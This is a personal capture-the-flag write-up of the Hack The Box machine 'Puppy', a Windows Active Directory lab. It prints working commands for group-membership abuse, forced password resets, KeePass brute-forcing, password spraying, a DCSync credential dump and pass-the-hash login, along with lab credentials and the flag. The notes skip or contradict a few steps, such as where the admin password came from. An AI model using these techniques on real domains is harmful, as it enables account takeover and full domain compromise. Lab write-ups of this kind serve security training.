## Intro

![](MediaFiles/Pasted%20image%2020250927222800.png)

Machine Information
```
As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025!, so its an assumed breach scenario
```
[[windows]] [[AssumedBreach]] [[DCSync]] [[ADdisabledaccount]] [[OSCPpath]] 
Tags: #windows #AssumedBreach #DCsync #ADdisabledaccount #OSCPpath 
Tools used:
- smbclient (smb enumeration)
- bloodyAD (add user to group, perform password reset)
- keepass2john
- keepass4brute.sh (kdbx bruteforce)
- impacket-secretsdump (DCSync)

------
# Reconnaissance

```bash
nano /etc/hosts
```

```bash
sudo nmap -sC -sV puppy.htb
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-20 03:45 EEST
Nmap scan report for puppy.htb (10.10.11.70)
Host is up (0.068s latency).
Not shown: 986 filtered tcp ports (no-response)
Bug in iscsi-info: no string output.
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-20 07:46:34Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3260/tcp open  iscsi?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-06-20T07:48:24
|_  start_date: N/A
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 218.41 seconds
```

| `smbclient -N -L //<FQDN/IP>`                     | Null session authentication on SMB.                       |
| ------------------------------------------------- | --------------------------------------------------------- |
| `smbclient //<FQDN/IP>/<share>`                   | Connect to a specific SMB share.                          |
| `rpcclient -U "" <FQDN/IP>`                       | Interaction with the target using RPC.                    |
| `samrdump.py <FQDN/IP>`                           | Username enumeration using Impacket scripts.              |
| `smbmap -H <FQDN/IP>`                             | Enumerating SMB shares.                                   |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Enumerating SMB shares using null session authentication. |
| `enum4linux-ng.py <FQDN/IP> -A`                   | SMB enumeration using enum4linux.                         |

## SMB shares enum
  
levi.james / KingofAkron2025!
```bash
smbclient -U 'levi.james' -L puppy.htb
```

```bash
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
DEV             Disk      DEV-SHARE for PUPPY-DEVS
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
```

lets go see the dev share
```bash
sudo smbclient //puppy.htb/DEV -U 'levi.james'
```
but we get this error when running commands, `NT_STATUS_ACCESS_DENIED listing \*`
->meaning our user does not have enough permissions on this share,

now add `dc.puppy.htb` to etc/hosts

lets run bloodhound now
```bash
sudo bloodhound-python -d puppy.htb -u levi.james -p KingofAkron2025! -ns 10.10.11.70 -c all
```

lets see the domain users
![image.png](image.png)

the user we currently have access is member of these groups
![image.png](image%201.png)

hm interesting, lets inspect the hr group
![image.png](image%202.png)

it has genericwrite over the developers group, lets now inspect developers group, we see it has these users as members

![image.png](image%203.png)

it has no outbound object control

lets now inspect these 3 users one by one
- jamie williams had nothing interesting (no outbound object control or other membership)
- ant edwards as group delegated object control is a memberof senior devs, and it can also be seen that the 3rd user adam silver is member too

![image.png](image%204.png)
so senior devs have **generic all** right towards adam silver

lets now inspect adam silver too
![image.png](image%205.png)
it seems he is member of remote management users too

lets check remote management users
![image.png](image%206.png)
hm does not appear that interesting, but if we run the query:
`Find Principals with DCSync Rights`

we see that step cooper has dcsync rights!
![image.png](image%207.png)
also lets run another query,
`List all kerberoastable accounts`

![image.png](image%208.png)
also running another query:
`Shortest Paths to Unconstrained Delegation Systems`

![image.png](image%209.png)

shows that adam silver, has canpsremote rights on the dc! but canpsremote does not seem sth that can help us, so lets move on,

so, it appears that this should be our path, to own adam silver and dcsync the dc. But first, we have to own ant edwards

so lets sum up what we know:
- our owned user (levi james) is member of HR group
- HR group has genericwrite over DEVELOPERS group
- DEVELOPERS group has as members both edwards and adam silver
- edwards is member of SENIOR DEVS group

SENIOR DEVS group has genericall over adam silver (meaning i can set a new password for adam silver and login then)

adam silver has dcsync rights on the DC

our goal, is to be a user thats member of SENIOR DEVS group, so we could either add our owned user (levi) to that group, or gain access to a user that is a member of that group.

So how to go from levi → edwards, or levi → senior devs?

I TOOK A HINT, BUT LETS START ALWAYS WITH WHAT WE KNOW!!!!

# Foothold

We KNOW that we have `GenericWrite` as HR group on DEVELOPERS group, so lets add levi there.
```bash
bloodyAD --host 10.10.11.70 -d 'dc.puppy.htb' -u 'levi.james' -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
```
Now we reached an IMPASS!!

→ BUT LETS REMEMBER THAT WE DID NOT HAVE ACCESS TO THE SMB SHARE BEFORE! NOW THAT WE ADDED OUR USER TO DEVELOPERS group LETS TRY AGAIN TO ACCESS THE SHARE!

### Checking smb shares

```bash
smbclient  //10.10.11.70/DEV -U levi.james
```

```bash
smb: \> ls
.                                  DR        0  Wed May 28 12:37:00 2025
..                                  D        0  Sat Mar  8 11:52:57 2025
KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025
Projects                            D        0  Sat Mar  8 11:53:36 2025
recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025
tiCPYdaK.exe                        A    56320  Wed May 28 12:37:00 2025
```
then use keepsass2john
```bash
keepass2john recovery.kdbx
```
## Bruteforcing kdbx file
```bash
./keepass4brute.sh ../recovery.kdbx /usr/share/wordlists/rockyou.txt

[*] Password found: liverpool
```

## Kdbx file contents

we have all the users:
```bash
Administrator  
Guest  
krbtgt  
levi.james  
ant.edwards  
adam.silver  
jamie.williams  
steph.cooper  
steph.cooper_adm  
```

and all the passwords
```bash
HJKL2025!
Antman2025!
JamieLove2025!
ILY2025!
Steve2025!
```

So now we have a list of usernames and a list of passwords, lets try all of their combinations to login towards a service, starting with `SMB`

## Password spraying

```bash
ntpdate puppy.htb
```

```bash
netexec smb 10.10.11.70 -u usernames.txt -p pass.txt
```

```bash
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025!
```


lets try logging via winrm
```bash
evil-winrm -i 10.10.11.70 -u ant.edwards -p 'Antman2025!'
```
hm it seems winrm is not open (also verified but our nmap scan)

BUT we might not be able to login via evil-winrm, we can login via bloodyad though and since we have genericall towards adam silver, we can do a pass reset!
```bash
└──╼ $crackmapexec smb 10.10.11.70 -u 'ADAM.SILVER' -p 'Thebestpass0!'
SMB         10.10.11.70     445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ADAM.SILVER:Thebestpass0! STATUS_ACCOUNT_DISABLED
```

## **Password Reset**

```bash
bloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'ant.edwards' -p 'Antman2025!' set password ADAM.SILVER Thebestpass0!
```
![image.png](image%2010.png)

great, it was successful, and there are the new creds of adam silver
```bash
ADAM.SILVER
Thebestpass0!
```
lets try logging via winrm
```bash
evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'Thebestpass0!'
```
BUT tried logging in via winrm, and no luck! WHY?

-> going back on bloodhound, i noticed that the account is `not enabled` ! so lets enable it
```bash
bloodyAD --host DC.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE
```
![image.png](image%2011.png)

nice, now that it is enabled, lets try the user's creds:
```bash
crackmapexec winrm 10.10.11.70 -u 'ADAM.SILVER' -p 'Thebestpass0!' -d puppy.htb
```

```bash
HTTP        10.10.11.70     5985   DC               [*] http://10.10.11.70:5985/wsman
HTTP        10.10.11.70     5985   DC               [+] puppy.htb\ADAM.SILVER:Thebestpass0! (Pwn3d!)
```
great! lets login with winrm now

## Logging in as adam.silver
  
Log in and grab the user flag:
```bash
evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'Thebestpass0!'
```

logged in successfully, then go to `\backups`, download the `zip` file, and find these creds for user steph cooper!
```bash
steph.cooper
ChefSteph2025!
```

remember our goal was `step.cooper_adm` because that user can DCSync the DC!!!! so we are almost done, lets perform DCSync

# Privesc
## DCsync

since we are now steph.cooper_adm , lets dcsync
```bash
impacket-secretsdump 'puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025!'@10.10.11.70
```

```bash
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::
```

## Logging in as Administrator

lets connect now via winrm
```bash
evil-winrm -i 10.10.11.70 -u ADMINISTRATOR -H 'bb0edc15e49ceb4120c7bd7e6e65d75b'
```

root flag found!
```bash
5c1e91e476e66b7153b05c515f9cda5a
```

---------
# Summary



-----------
# Sidenotes

A classic straightforward AD machine, this one is valuable for me due to the `disabled AD account`, which i saw for the first time, and was stuck by not knowing why i could not log in to it xd.

![](MediaFiles/Pasted%20image%2020250927222837.png)